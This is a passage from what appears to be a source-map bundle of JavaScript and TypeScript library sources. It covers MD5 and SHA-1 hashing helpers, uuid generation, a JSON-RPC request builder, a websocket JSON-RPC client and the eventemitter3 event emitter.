x[i + 13], 5, -1444681467);\n    d = md5gg(d, a, b, c, x[i + 2], 9, -51403784);\n    c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473);\n    b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734);\n    a = md5hh(a, b, c, d, x[i + 5], 4, -378558);\n    d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463);\n    c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562);\n    b = md5hh(b, c, d, a, x[i + 14], 23, -35309556);\n    a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060);\n    d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353);\n    c = md5hh(c, d, a, b, x[i + 7], 16, -155497632);\n    b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640);\n    a = md5hh(a, b, c, d, x[i + 13], 4, 681279174);\n    d = md5hh(d, a, b, c, x[i], 11, -358537222);\n    c = md5hh(c, d, a, b, x[i + 3], 16, -722521979);\n    b = md5hh(b, c, d, a, x[i + 6], 23, 76029189);\n    a = md5hh(a, b, c, d, x[i + 9], 4, -640364487);\n    d = md5hh(d, a, b, c, x[i + 12], 11, -421815835);\n    c = md5hh(c, d, a, b, x[i + 15], 16, 530742520);\n    b = md5hh(b, c, d, a, x[i + 2], 23, -995338651);\n    a = md5ii(a, b, c, d, x[i], 6, -198630844);\n    d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415);\n    c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905);\n    b = md5ii(b, c, d, a, x[i + 5], 21, -57434055);\n    a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571);\n    d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606);\n    c = md5ii(c, d, a, b, x[i + 10], 15, -1051523);\n    b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799);\n    a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359);\n    d = md5ii(d, a, b, c, x[i + 15], 10, -30611744);\n    c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380);\n    b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649);\n    a = md5ii(a, b, c, d, x[i + 4], 6, -145523070);\n    d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379);\n    c = md5ii(c, d, a, b, x[i + 2], 15, 718787259);\n    b = md5ii(b, c, d, a, x[i + 9], 21, -343485551);\n    a = safeAdd(a, olda);\n    b = safeAdd(b, oldb);\n    c = safeAdd(c, oldc);\n    d = safeAdd(d, oldd);\n  }\n\n  return [a, b, c, d];\n}\n/*\n * Convert an array bytes to an array of little-endian words\n * Characters >255 have their high-byte silently ignored.\n */\n\n\nfunction bytesToWords(input) {\n  if (input.length === 0) {\n    return [];\n  }\n\n  var length8 = input.length * 8;\n  var output = new Uint32Array(getOutputLength(length8));\n\n  for (var i = 0; i < length8; i += 8) {\n    output[i >> 5] |= (input[i / 8] & 0xff) << i % 32;\n  }\n\n  return output;\n}\n/*\n * Add integers, wrapping at 2^32. This uses 16-bit operations internally\n * to work around bugs in some JS interpreters.\n */\n\n\nfunction safeAdd(x, y) {\n  var lsw = (x & 0xffff) + (y & 0xffff);\n  var msw = (x >> 16) + (y >> 16) + (lsw >> 16);\n  return msw << 16 | lsw & 0xffff;\n}\n/*\n * Bitwise rotate a 32-bit number to the left.\n */\n\n\nfunction bitRotateLeft(num, cnt) {\n  return num << cnt | num >>> 32 - cnt;\n}\n/*\n * These functions implement the four basic operations the algorithm uses.\n */\n\n\nfunction md5cmn(q, a, b, x, s, t) {\n  return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b);\n}\n\nfunction md5ff(a, b, c, d, x, s, t) {\n  return md5cmn(b & c | ~b & d, a, b, x, s, t);\n}\n\nfunction md5gg(a, b, c, d, x, s, t) {\n  return md5cmn(b & d | c & ~d, a, b, x, s, t);\n}\n\nfunction md5hh(a, b, c, d, x, s, t) {\n  return md5cmn(b ^ c ^ d, a, b, x, s, t);\n}\n\nfunction md5ii(a, b, c, d, x, s, t) {\n  return md5cmn(c ^ (b | ~d), a, b, x, s, t);\n}\n\nexport default md5;","import rng from './rng.js';\nimport stringify from './stringify.js';\n\nfunction v4(options, buf, offset) {\n  options = options || {};\n  var rnds = options.random || (options.rng || rng)(); // Per 4.4, set bits for version and `clock_seq_hi_and_reserved`\n\n  rnds[6] = rnds[6] & 0x0f | 0x40;\n  rnds[8] = rnds[8] & 0x3f | 0x80; // Copy bytes to buffer, if provided\n\n  if (buf) {\n    offset = offset || 0;\n\n    for (var i = 0; i < 16; ++i) {\n      buf[offset + i] = rnds[i];\n    }\n\n    return buf;\n  }\n\n  return stringify(rnds);\n}\n\nexport default v4;","import v35 from './v35.js';\nimport sha1 from './sha1.js';\nvar v5 = v35('v5', 0x50, sha1);\nexport default v5;","// Adapted from Chris Veness' SHA1 code at\n// http://www.movable-type.co.uk/scripts/sha1.html\nfunction f(s, x, y, z) {\n  switch (s) {\n    case 0:\n      return x & y ^ ~x & z;\n\n    case 1:\n      return x ^ y ^ z;\n\n    case 2:\n      return x & y ^ x & z ^ y & z;\n\n    case 3:\n      return x ^ y ^ z;\n  }\n}\n\nfunction ROTL(x, n) {\n  return x << n | x >>> 32 - n;\n}\n\nfunction sha1(bytes) {\n  var K = [0x5a827999, 0x6ed9eba1, 0x8f1bbcdc, 0xca62c1d6];\n  var H = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];\n\n  if (typeof bytes === 'string') {\n    var msg = unescape(encodeURIComponent(bytes)); // UTF8 escape\n\n    bytes = [];\n\n    for (var i = 0; i < msg.length; ++i) {\n      bytes.push(msg.charCodeAt(i));\n    }\n  } else if (!Array.isArray(bytes)) {\n    // Convert Array-like to Array\n    bytes = Array.prototype.slice.call(bytes);\n  }\n\n  bytes.push(0x80);\n  var l = bytes.length / 4 + 2;\n  var N = Math.ceil(l / 16);\n  var M = new Array(N);\n\n  for (var _i = 0; _i < N; ++_i) {\n    var arr = new Uint32Array(16);\n\n    for (var j = 0; j < 16; ++j) {\n      arr[j] = bytes[_i * 64 + j * 4] << 24 | bytes[_i * 64 + j * 4 + 1] << 16 | bytes[_i * 64 + j * 4 + 2] << 8 | bytes[_i * 64 + j * 4 + 3];\n    }\n\n    M[_i] = arr;\n  }\n\n  M[N - 1][14] = (bytes.length - 1) * 8 / Math.pow(2, 32);\n  M[N - 1][14] = Math.floor(M[N - 1][14]);\n  M[N - 1][15] = (bytes.length - 1) * 8 & 0xffffffff;\n\n  for (var _i2 = 0; _i2 < N; ++_i2) {\n    var W = new Uint32Array(80);\n\n    for (var t = 0; t < 16; ++t) {\n      W[t] = M[_i2][t];\n    }\n\n    for (var _t = 16; _t < 80; ++_t) {\n      W[_t] = ROTL(W[_t - 3] ^ W[_t - 8] ^ W[_t - 14] ^ W[_t - 16], 1);\n    }\n\n    var a = H[0];\n    var b = H[1];\n    var c = H[2];\n    var d = H[3];\n    var e = H[4];\n\n    for (var _t2 = 0; _t2 < 80; ++_t2) {\n      var s = Math.floor(_t2 / 20);\n      var T = ROTL(a, 5) + f(s, b, c, d) + e + K[s] + W[_t2] >>> 0;\n      e = d;\n      d = c;\n      c = ROTL(b, 30) >>> 0;\n      b = a;\n      a = T;\n    }\n\n    H[0] = H[0] + a >>> 0;\n    H[1] = H[1] + b >>> 0;\n    H[2] = H[2] + c >>> 0;\n    H[3] = H[3] + d >>> 0;\n    H[4] = H[4] + e >>> 0;\n  }\n\n  return [H[0] >> 24 & 0xff, H[0] >> 16 & 0xff, H[0] >> 8 & 0xff, H[0] & 0xff, H[1] >> 24 & 0xff, H[1] >> 16 & 0xff, H[1] >> 8 & 0xff, H[1] & 0xff, H[2] >> 24 & 0xff, H[2] >> 16 & 0xff, H[2] >> 8 & 0xff, H[2] & 0xff, H[3] >> 24 & 0xff, H[3] >> 16 & 0xff, H[3] >> 8 & 0xff, H[3] & 0xff, H[4] >> 24 & 0xff, H[4] >> 16 & 0xff, H[4] >> 8 & 0xff, H[4] & 0xff];\n}\n\nexport default sha1;","export default '00000000-0000-0000-0000-000000000000';","import validate from './validate.js';\n\nfunction version(uuid) {\n  if (!validate(uuid)) {\n    throw TypeError('Invalid UUID');\n  }\n\n  return parseInt(uuid.substr(14, 1), 16);\n}\n\nexport default version;","'use strict';\n\nconst uuid = require('uuid').v4;\n\n/**\n *  Generates a JSON-RPC 1.0 or 2.0 request\n *  @param {String} method Name of method to call\n *  @param {Array|Object} params Array of parameters passed to the method as specified, or an object of parameter names and corresponding value\n *  @param {String|Number|null} [id] Request ID can be a string, number, null for explicit notification or left out for automatic generation\n *  @param {Object} [options]\n *  @param {Number} [options.version=2] JSON-RPC version to use (1 or 2)\n *  @param {Boolean} [options.notificationIdNull=false] When true, version 2 requests will set id to null instead of omitting it\n *  @param {Function} [options.generator] Passed the request, and the options object and is expected to return a request ID\n *  @throws {TypeError} If any of the parameters are invalid\n *  @return {Object} A JSON-RPC 1.0 or 2.0 request\n *  @memberOf Utils\n */\nconst generateRequest = function(method, params, id, options) {\n  if(typeof method !== 'string') {\n    throw new TypeError(method + ' must be a string');\n  }\n\n  options = options || {};\n\n  // check valid version provided\n  const version = typeof options.version === 'number' ? options.version : 2;\n  if (version !== 1 && version !== 2) {\n    throw new TypeError(version + ' must be 1 or 2');\n  }\n\n  const request = {\n    method: method\n  };\n\n  if(version === 2) {\n    request.jsonrpc = '2.0';\n  }\n\n  if(params) {\n    // params given, but invalid?\n    if(typeof params !== 'object' && !Array.isArray(params)) {\n      throw new TypeError(params + ' must be an object, array or omitted');\n    }\n    request.params = params;\n  }\n\n  // if id was left out, generate one (null means explicit notification)\n  if(typeof(id) === 'undefined') {\n    const generator = typeof options.generator === 'function' ? options.generator : function() { return uuid(); };\n    request.id = generator(request, options);\n  } else if (version === 2 && id === null) {\n    // we have a version 2 notification\n    if (options.notificationIdNull) {\n      request.id = null; // id will not be set at all unless option provided\n    }\n  } else {\n    request.id = id;\n  }\n\n  return request;\n};\n\nmodule.exports = generateRequest;\n",null,"export { Buffer } from \"buffer\";\n","/**\n * WebSocket implements a browser-side WebSocket specification.\n * @module Client\n */\n\n\"use strict\"\n\nimport { EventEmitter } from \"eventemitter3\"\n\nimport {\n    BrowserWebSocketType,\n    NodeWebSocketType,\n    IWSClientAdditionalOptions,\n} from \"./client.types.js\"\n\nclass WebSocketBrowserImpl extends EventEmitter\n{\n    socket: BrowserWebSocketType\n\n    /** Instantiate a WebSocket class\n   * @constructor\n   * @param {String} address - url to a websocket server\n   * @param {(Object)} options - websocket options\n   * @param {(String|Array)} protocols - a list of protocols\n   * @return {WebSocketBrowserImpl} - returns a WebSocket instance\n   */\n    constructor(address: string, options: {}, protocols?: string | string[])\n    {\n        super()\n\n        this.socket = new window.WebSocket(address, protocols)\n\n        this.socket.onopen = () => this.emit(\"open\")\n        this.socket.onmessage = (event) => this.emit(\"message\", event.data)\n        this.socket.onerror = (error) => this.emit(\"error\", error)\n        this.socket.onclose = (event) =>\n        {\n            this.emit(\"close\", event.code, event.reason)\n        }\n    }\n\n    /**\n   * Sends data through a websocket connection\n   * @method\n   * @param {(String|Object)} data - data to be sent via websocket\n   * @param {Object} optionsOrCallback - ws options\n   * @param {Function} callback - a callback called once the data is sent\n   * @return {Undefined}\n   */\n    send(\n        data: Parameters<BrowserWebSocketType[\"send\"]>[0],\n        optionsOrCallback: (\n      error?: Error\n    ) => void | Parameters<NodeWebSocketType[\"send\"]>[1],\n        callback?: () => void\n    )\n    {\n        const cb = callback || optionsOrCallback\n\n        try\n        {\n            this.socket.send(data)\n            cb()\n        }\n        catch (error)\n        {\n            cb(error)\n        }\n    }\n\n    /**\n   * Closes an underlying socket\n   * @method\n   * @param {Number} code - status code explaining why the connection is being closed\n   * @param {String} reason - a description why the connection is closing\n   * @return {Undefined}\n   * @throws {Error}\n   */\n    close(code?: number, reason?: string)\n    {\n        this.socket.close(code, reason)\n    }\n\n    addEventListener<K extends keyof WebSocketEventMap>(\n        type: K,\n        listener: (ev: WebSocketEventMap[K]) => any,\n        options?: boolean | AddEventListenerOptions\n    ): void\n    {\n        this.socket.addEventListener(type, listener, options)\n    }\n}\n\n/**\n * factory method for common WebSocket instance\n * @method\n * @param {String} address - url to a websocket server\n * @param {(Object)} options - websocket options\n * @return {Undefined}\n */\nexport function WebSocket(\n    address: string,\n    options: IWSClientAdditionalOptions\n)\n{\n    return new WebSocketBrowserImpl(address, options)\n}\n","/**\n * \"Client\" wraps \"ws\" or a browser-implemented \"WebSocket\" library\n * according to the environment providing JSON RPC 2.0 support on top.\n * @module Client\n */\n\n\"use strict\"\n\nimport NodeWebSocket from \"ws\"\nimport { EventEmitter } from \"eventemitter3\"\nimport {\n    ICommonWebSocket,\n    IWSClientAdditionalOptions,\n    NodeWebSocketType,\n    ICommonWebSocketFactory,\n} from \"./client/client.types.js\"\n\nimport { DataPack, DefaultDataPack } from \"./utils.js\"\n\ninterface IQueueElement {\n  promise: [\n    Parameters<ConstructorParameters<typeof Promise>[0]>[0],\n    Parameters<ConstructorParameters<typeof Promise>[0]>[1]\n  ];\n  timeout?: ReturnType<typeof setTimeout>;\n}\n\nexport interface IQueue {\n  [x: number]: IQueueElement;\n}\n\nexport interface IWSRequestParams {\n  [x: string]: any;\n  [x: number]: any;\n}\n\nexport class CommonClient extends EventEmitter\n{\n    private address: string\n    private rpc_id: number\n    private queue: IQueue\n    private options: IWSClientAdditionalOptions & NodeWebSocket.ClientOptions\n    private autoconnect: boolean\n    private ready: boolean\n    private reconnect: boolean\n    private reconnect_timer_id: NodeJS.Timeout\n    private reconnect_interval: number\n    private max_reconnects: number\n    private rest_options: IWSClientAdditionalOptions &\n    NodeWebSocket.ClientOptions\n    private current_reconnects: number\n    private generate_request_id: (\n    method: string,\n    params: object | Array<any>\n  ) => number\n    private socket: ICommonWebSocket\n    private webSocketFactory: ICommonWebSocketFactory\n    private dataPack: DataPack<object, string>\n\n    /**\n   * Instantiate a Client class.\n   * @constructor\n   * @param {webSocketFactory} webSocketFactory - factory method for WebSocket\n   * @param {String} address - url to a websocket server\n   * @param {Object} options - ws options object with reconnect parameters\n   * @param {Function} generate_request_id - custom generation request Id\n   * @param {DataPack} dataPack - data pack contains encoder and decoder\n   * @return {CommonClient}\n   */\n    constructor(\n        webSocketFactory: ICommonWebSocketFactory,\n        address = \"ws://localhost:8080\",\n        {\n            autoconnect = true,\n            reconnect = true,\n            reconnect_interval = 1000,\n            max_reconnects = 5,\n            ...rest_options\n        } = {},\n        generate_request_id?: (\n      method: string,\n      params: object | Array<any>\n    ) => number,\n        dataPack?: DataPack<object, string>\n    )\n    {\n        super()\n\n        this.webSocketFactory = webSocketFactory\n\n        this.queue = {}\n        this.rpc_id = 0\n\n        this.address = address\n        this.autoconnect = autoconnect\n        this.ready = false\n        this.reconnect = reconnect\n        this.reconnect_timer_id = undefined\n        this.reconnect_interval = reconnect_interval\n        this.max_reconnects = max_reconnects\n        this.rest_options = rest_options\n        this.current_reconnects = 0\n        this.generate_request_id = generate_request_id || (() => ++this.rpc_id)\n\n        if (!dataPack) this.dataPack = new DefaultDataPack()\n        else this.dataPack = dataPack\n\n        if (this.autoconnect)\n            this._connect(this.address, {\n                autoconnect: this.autoconnect,\n                reconnect: this.reconnect,\n                reconnect_interval: this.reconnect_interval,\n                max_reconnects: this.max_reconnects,\n                ...this.rest_options,\n            })\n    }\n\n    /**\n   * Connects to a defined server if not connected already.\n   * @method\n   * @return {Undefined}\n   */\n    connect()\n    {\n        if (this.socket) return\n\n        this._connect(this.address, {\n            autoconnect: this.autoconnect,\n            reconnect: this.reconnect,\n            reconnect_interval: this.reconnect_interval,\n            max_reconnects: this.max_reconnects,\n            ...this.rest_options,\n        })\n    }\n\n    /**\n   * Calls a registered RPC method on server.\n   * @method\n   * @param {String} method - RPC method name\n   * @param {Object|Array} params - optional method parameters\n   * @param {Number} timeout - RPC reply timeout value\n   * @param {Object} ws_opts - options passed to ws\n   * @return {Promise}\n   */\n    call(\n        method: string,\n        params?: IWSRequestParams,\n        timeout?: number,\n        ws_opts?: Parameters<NodeWebSocketType[\"send\"]>[1]\n    )\n    {\n        if (!ws_opts && \"object\" === typeof timeout)\n        {\n            ws_opts = timeout\n            timeout = null\n        }\n\n        return new Promise((resolve, reject) =>\n        {\n            if (!this.ready) return reject(new Error(\"socket not ready\"))\n\n            const rpc_id = this.generate_request_id(method, params)\n\n            const message = {\n                jsonrpc: \"2.0\",\n                method: method,\n                params: params || undefined,\n                id: rpc_id,\n            }\n\n            this.socket.send(this.dataPack.encode(message), ws_opts, (error) =>\n            {\n                if (error) return reject(error)\n\n                this.queue[rpc_id] = { promise: [resolve, reject] }\n\n                if (timeout)\n                {\n                    this.queue[rpc_id].timeout = setTimeout(() =>\n                    {\n                        delete this.queue[rpc_id]\n                        reject(new Error(\"reply timeout\"))\n                    }, timeout)\n                }\n            })\n        })\n    }\n\n    /**\n   * Logins with the other side of the connection.\n   * @method\n   * @param {Object} params - Login credentials object\n   * @return {Promise}\n   */\n    async login(params: IWSRequestParams)\n    {\n        const resp = await this.call(\"rpc.login\", params)\n\n        if (!resp) throw new Error(\"authentication failed\")\n\n        return resp\n    }\n\n    /**\n   * Fetches a list of client's methods registered on server.\n   * @method\n   * @return {Array}\n   */\n    async listMethods()\n    {\n        return await this.call(\"__listMethods\")\n    }\n\n    /**\n   * Sends a JSON-RPC 2.0 notification to server.\n   * @method\n   * @param {String} method - RPC method name\n   * @param {Object} params - optional method parameters\n   * @return {Promise}\n   */\n    notify(method: string, params?: IWSRequestParams)\n    {\n        return new Promise<void>((resolve, reject) =>\n        {\n            if (!this.ready) return reject(new Error(\"socket not ready\"))\n\n            const message = {\n                jsonrpc: \"2.0\",\n                method: method,\n                params,\n            }\n\n            this.socket.send(this.dataPack.encode(message), (error) =>\n            {\n                if (error) return reject(error)\n\n                resolve()\n            })\n        })\n    }\n\n    /**\n   * Subscribes for a defined event.\n   * @method\n   * @param {String|Array} event - event name\n   * @return {Undefined}\n   * @throws {Error}\n   */\n    async subscribe(event: string | Array<string>)\n    {\n        if (typeof event === \"string\") event = [event]\n\n        const result = await this.call(\"rpc.on\", event)\n\n        if (typeof event === \"string\" && result[event] !== \"ok\")\n            throw new Error(\n                \"Failed subscribing to an event '\" + event + \"' with: \" + result[event]\n            )\n\n        return result\n    }\n\n    /**\n   * Unsubscribes from a defined event.\n   * @method\n   * @param {String|Array} event - event name\n   * @return {Undefined}\n   * @throws {Error}\n   */\n    async unsubscribe(event: string | Array<string>)\n    {\n        if (typeof event === \"string\") event = [event]\n\n        const result = await this.call(\"rpc.off\", event)\n\n        if (typeof event === \"string\" && result[event] !== \"ok\")\n            throw new Error(\"Failed unsubscribing from an event with: \" + result)\n\n        return result\n    }\n\n    /**\n   * Closes a WebSocket connection gracefully.\n   * @method\n   * @param {Number} code - socket close code\n   * @param {String} data - optional data to be sent before closing\n   * @return {Undefined}\n   */\n    close(code?: number, data?: string)\n    {\n        this.socket.close(code || 1000, data)\n    }\n\n    /**\n   * Enable / disable automatic reconnection.\n   * @method\n   * @param {Boolean} reconnect - enable / disable reconnection\n   * @return {Undefined}\n   */\n    setAutoReconnect(reconnect: boolean)\n    {\n        this.reconnect = reconnect\n    }\n\n    /**\n   * Set the interval between reconnection attempts.\n   * @method\n   * @param {Number} interval - reconnection interval in milliseconds\n   * @return {Undefined}\n   */\n    setReconnectInterval(interval: number)\n    {\n        this.reconnect_interval = interval\n    }\n\n    /**\n   * Set the maximum number of reconnection attempts.\n   * @method\n   * @param {Number} max_reconnects - maximum reconnection attempts\n   * @return {Undefined}\n   */\n    setMaxReconnects(max_reconnects: number)\n    {\n        this.max_reconnects = max_reconnects\n    }\n\n    /**\n   * Connection/Message handler.\n   * @method\n   * @private\n   * @param {String} address - WebSocket API address\n   * @param {Object} options - ws options object\n   * @return {Undefined}\n   */\n    private _connect(\n        address: string,\n        options: IWSClientAdditionalOptions & NodeWebSocket.ClientOptions\n    )\n    {\n        clearTimeout(this.reconnect_timer_id)\n        this.socket = this.webSocketFactory(address, options)\n\n        this.socket.addEventListener(\"open\", () =>\n        {\n            this.ready = true\n            this.emit(\"open\")\n            this.current_reconnects = 0\n        })\n\n        this.socket.addEventListener(\"message\", ({ data: message }) =>\n        {\n            if (message instanceof ArrayBuffer)\n                message = Buffer.from(message).toString()\n\n            try\n            {\n                message = this.dataPack.decode(message)\n            }\n            catch (error)\n            {\n                return\n            }\n\n            // check if any listeners are attached and forward event\n            if (message.notification && this.listeners(message.notification).length)\n            {\n                if (!Object.keys(message.params).length)\n                    return this.emit(message.notification)\n\n                const args = [message.notification]\n\n                if (message.params.constructor === Object) args.push(message.params)\n                // using for-loop instead of unshift/spread because performance is better\n                else\n                    for (let i = 0; i < message.params.length; i++)\n                        args.push(message.params[i])\n\n                // run as microtask so that pending queue messages are resolved first\n                // eslint-disable-next-line prefer-spread\n                return Promise.resolve().then(() =>\n                {\n                    // eslint-disable-next-line prefer-spread\n                    this.emit.apply(this, args)\n                })\n            }\n\n            if (!this.queue[message.id])\n            {\n                // general JSON RPC 2.0 events\n                if (message.method)\n                {\n                    // run as microtask so that pending queue messages are resolved first\n                    return Promise.resolve().then(() =>\n                    {\n                        this.emit(message.method, message?.params)\n                    })\n                }\n\n                return\n            }\n\n            // reject early since server's response is invalid\n            if (\"error\" in message === \"result\" in message)\n                this.queue[message.id].promise[1](\n                    new Error(\n                        \"Server response malformed. Response must include either \\\"result\\\"\" +\n              \" or \\\"error\\\", but not both.\"\n                    )\n                )\n\n            if (this.queue[message.id].timeout)\n                clearTimeout(this.queue[message.id].timeout)\n\n            if (message.error) this.queue[message.id].promise[1](message.error)\n            else this.queue[message.id].promise[0](message.result)\n\n            delete this.queue[message.id]\n        })\n\n        this.socket.addEventListener(\"error\", (error) => this.emit(\"error\", error))\n\n        this.socket.addEventListener(\"close\", ({ code, reason }) =>\n        {\n            if (this.ready)\n            // Delay close event until internal state is updated\n                setTimeout(() => this.emit(\"close\", code, reason), 0)\n\n            this.ready = false\n            this.socket = undefined\n\n            if (code === 1000) return\n\n            this.current_reconnects++\n\n            if (\n                this.reconnect &&\n        (this.max_reconnects > this.current_reconnects ||\n          this.max_reconnects === 0)\n            )\n                this.reconnect_timer_id = setTimeout(\n                    () => this._connect(address, options),\n                    this.reconnect_interval\n                )\n        })\n    }\n}\n","\"use strict\"\n\nexport interface DataPack<\n  T,\n  R extends string | ArrayBufferLike | Blob | ArrayBufferView\n> {\n  encode(value: T): R;\n  decode(value: R): T;\n}\n\nexport class DefaultDataPack implements DataPack<Object, string>\n{\n    encode(value: Object): string\n    {\n        return JSON.stringify(value)\n    }\n\n    decode(value: string): Object\n    {\n        return JSON.parse(value)\n    }\n}\n","\"use strict\"\n\nimport { WebSocket } from \"./lib/client/websocket.browser.js\"\nimport { CommonClient } from \"./lib/client.js\"\nimport { IWSClientAdditionalOptions } from \"./lib/client/client.types.js\"\n\nexport class Client extends CommonClient\n{\n    constructor(\n        address = \"ws://localhost:8080\",\n        {\n            autoconnect = true,\n            reconnect = true,\n            reconnect_interval = 1000,\n            max_reconnects = 5,\n        }: IWSClientAdditionalOptions = {},\n        generate_request_id?: (\n      method: string,\n      params: object | Array<any>\n    ) => number\n    )\n    {\n        super(\n            WebSocket,\n            address,\n            {\n                autoconnect,\n                reconnect,\n                reconnect_interval,\n                max_reconnects,\n            },\n            generate_request_id\n        )\n    }\n}\n\nexport * from \"./lib/client.js\"\nexport * from \"./lib/client/websocket.browser.js\"\nexport * from \"./lib/client/client.types.js\"\nexport * from \"./lib/utils.js\"\n","'use strict';\n\nvar has = Object.prototype.hasOwnProperty\n  , prefix = '~';\n\n/**\n * Constructor to create a storage for our `EE` objects.\n * An `Events` instance is a plain object whose properties are event names.\n *\n * @constructor\n * @private\n */\nfunction Events() {}\n\n//\n// We try to not inherit from `Object.prototype`. In some engines creating an\n// instance in this way is faster than calling `Object.create(null)` directly.\n// If `Object.create(null)` is not supported we prefix the event names with a\n// character to make sure that the built-in object properties are not\n// overridden or used as an attack vector.\n//\nif (Object.create) {\n  Events.prototype = Object.create(null);\n\n  //\n  // This hack is needed because the `__proto__` property is still inherited in\n  // some old browsers like Android 4, iPhone 5.1, Opera 11 and Safari 5.\n  //\n  if (!new Events().__proto__) prefix = false;\n}\n\n/**\n * Representation of a single event listener.\n *\n * @param {Function} fn The listener function.\n * @param {*} context The context to invoke the listener with.\n * @param {Boolean} [once=false] Specify if the listener is a one-time listener.\n * @constructor\n * @private\n */\nfunction EE(fn, context, once) {\n  this.fn = fn;\n  this.context = context;\n  this.once = once || false;\n}\n\n/**\n * Add a listener for a given event.\n *\n * @param {EventEmitter} emitter Reference to the `EventEmitter` instance.\n * @param {(String|Symbol)} event The event name.\n * @param {Function} fn The listener function.\n * @param {*} context The context to invoke the listener with.\n * @param {Boolean} once Specify if the listener is a one-time listener.\n * @returns {EventEmitter}\n * @private\n */\nfunction addListener(emitter, event, fn, context, once) {\n  if (typeof fn !== 'function') {\n    throw new TypeError('The listener must be a function');\n  }\n\n  var listener = new EE(fn, context || emitter, once)\n    , evt = prefix ? prefix + event : event;\n\n  if (!emitter._events[evt]) emitter._events[evt] = listener, emitter._eventsCount++;\n  else if (!emitter._events[evt].fn) emitter._events[evt].push(listener);\n  else emitter._events[evt] = [emitter._events[evt], listener];\n\n  return emitter;\n}\n\n/**\n * Clear event by name.\n *\n * @param {EventEmitter} emitter Reference to the `EventEmitter` instance.\n * @param {(String|Symbol)} evt The Event name.\n * @private\n */\nfunction clearEvent(emitter, evt) {\n  if (--emitter._eventsCount === 0) emitter._events = new Events();\n  else delete emitter._events[evt];\n}\n\n/**\n * Minimal `EventEmitter` interface that is molded against the Node.js\n * `EventEmitter` interface.\n *\n * @constructor\n * @public\n */\nfunction EventEmitter() {\n  this._events = new Events();\n  this._eventsCount = 0;\n}\n\n/**\n * Return an array listing the events for which the emitter has registered\n * listeners.\n *\n * @returns {Array}\n * @public\n */\nEventEmitter.prototype.eventNames = function eventNames() {\n  var names = []\n    , events\n    , name;\n\n  if (this._eventsCount === 0) return names;\n\n  for (name in (events = this._events)) {\n    if (has.call(events, name)) names.push(prefix ? name.slice(1) : name);\n  }\n\n  if (Object.getOwnPropertySymbols) {\n    return names.concat(Object.getOwnPropertySymbols(events));\n  }\n\n  return names;\n};\n\n/**\n * Return the listeners registered for a given event.\n *\n * @param {(String|Symbol)} event The event name.\n * @returns {Array} The registered listeners.\n * @public\n */\nEventEmitter.prototype.listeners = function listeners(event) {\n  var evt = prefix ? prefix + event : event\n    , handlers = this._events[evt];\n\n  if (!handlers) return [];\n  if (handlers.fn) return [handlers.fn];\n\n  for (var i = 0, l = handlers.length, ee = new Array(l); i < l; i++) {\n    ee[i] = handlers[i].fn;\n  }\n\n  return ee;\n};\n\n/**\n * Return the number of listeners listening to a given event.\n *\n * @param {(String|Symbol)} event The event name.\n * @returns {Number} The number of listeners.\n * @public\n */\nEventEmitter.prototype.listenerCount = function listenerCount(event) {\n  var evt = prefix ? prefix + event : event\n    , listeners = this._events[evt];\n\n  if (!listeners) return 0;\n  if (listeners.fn) return 1;\n  return listeners.length;\n};\n\n/**\n * Calls each of the listeners registered for a given event.\n *\n * @param {(String|Symbol)} event The event name.\n * @returns {Boolean} `true` if the event had listeners, else `false`.\n * @public\n */\nEventEmitter.prototype.emit = function emit(event, a1, a2, a3, a4, a5) {\n  var evt = prefix ? prefix + event : event;\n\n  if (!this._events[evt]) return false;\n\n  var listeners = this._events[evt]\n    , len = arguments.length\n    , args\n    , i;\n\n  if (listeners.fn) {\n    if (listeners.once) this.removeListener(event, listeners.fn, undefined, true);\n\n    switch (len) {\n      case 1: return listeners.fn.call(listeners.context), true;\n      case 2: return listeners.fn.call(listeners.context, a1), true;\n      case 3: return listeners.fn.call(listeners.context, a1, a2), true;\n      case 4: return listeners.fn.call(listeners.context, a1, a2, a3), true;\n      case 5: return listeners.fn.call(listeners.context, a1, a2, a3, a4), true;\n      case 6: return listeners.fn.call(listeners.context, a1, a2, a3, a4, a5), true;\n    }\n\n    for (i = 1, args = new Array(len -1); i < len; i++) {\n      args[i - 1] = arguments[i];\n    }\n\n    listeners.fn.apply(listeners.context, args);\n  } else {\n    var length = listeners.length\n      , j;\n\n    for (i = 0; i < length; i++) {\n      if (listeners[i].once) this.removeListener(event, listeners[i].fn, undefined, true);\n\n      switch (len) {\n        case 1: listeners[i].fn.call(listeners[i].context); break;\n        case 2: listeners[i].fn.call(listeners[i].context, a1); break;\n        case 3: listeners[i].fn.call(listeners[i].context, a1, a2); break;\n        case 4: listeners[i].fn.call(listeners[i].context, a1, a2, a3); break;\n        default:\n          if (!args) for (j = 1, args = new Array(len -1); j < len; j++) {\n            args[j - 1] = arguments[j];\n          }\n\n          listeners[i].fn.apply(listeners[i].context, args);\n      }\n    }\n  }\n\n  return true;\n};\n\n/**\n * Add a listener for a given event.\n *\n * @param {(String|Symbol)} event The event name.\n * @param {Function} fn The listener function.\n * @param {*} [context=this] The context to invoke the listener with.\n * @returns {EventEmitter} `this`.\n * @public\n */\nEventEmitter.prototype.on = function on(event, fn, context) {\n  return addListener(this, event, fn, context, false);\n};\n\n/**\n * Add a one-time listener for a given event.\n *\n * @param {(String|Symbol)} event The event name.\n * @param {Function} fn The listener function.\n * @param {*} [context=this] The context to invoke the listener with.\n * @returns {EventEmitter} `this`.\n * @public\n */\nEventEmitter.prototype.once = function once(event, fn, context) {\n  return addListener(this, event, fn, context, true);\n};\n\n/**\n * Remove the listeners of a given event.\n *\n * @param {(String|Symbol)} event The event name.\n * @param {Function} fn Only remove the listeners that match this function.\n * @param {*} context Only remove the listeners that have this context.\n * @param {Boolean} once Only remove 